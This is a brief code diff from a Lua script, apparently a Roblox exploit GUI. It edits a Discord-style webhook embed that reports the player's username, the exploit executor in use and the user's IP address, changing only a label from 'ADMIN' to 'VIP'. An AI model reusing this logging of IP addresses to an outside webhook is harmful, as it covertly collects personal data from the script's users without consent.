@@ -706,7 +706,7 @@ local data = {
 ["content"] = "Game: Fort Martin. Detected user:",
 ["embeds"] = {
 {
-["title"] =  "Username: " .. game.Players.LocalPlayer.Name..". Exploit: "..webhookcheck..".".." IP: " ..ip..".".." GUI: ADMIN"..".",
+["title"] =  "Username: " .. game.Players.LocalPlayer.Name..". Exploit: "..webhookcheck..".".." IP: " ..ip..".".." GUI: VIP"..".",
 ["type"] = "rich",
 ["color"] = tonumber(0),
 ["image"] = {
